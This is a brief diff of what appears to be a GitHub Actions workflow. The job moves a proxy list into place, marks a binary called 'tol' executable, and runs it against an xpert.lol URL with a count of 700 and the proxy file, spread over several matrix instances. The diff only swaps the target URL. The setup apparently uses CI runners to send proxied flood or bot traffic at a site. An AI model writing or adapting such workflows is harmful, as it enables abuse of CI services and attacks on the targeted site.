@@ -35,7 +35,7 @@ jobs:
           mv  Fc-main/proxy.txt 90.txt
           chmod +x tol
           
-          ./tol https://xpert.lol/6901966783-b4f19721-26aa-4f4e-a850-02414db09c9b 700 1 1 90.txt 
+          ./tol https://xpert.lol/6901966783-a6ea9550-875f-478e-b2ec-6c923ecb54ee 700 1 1 90.txt 
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
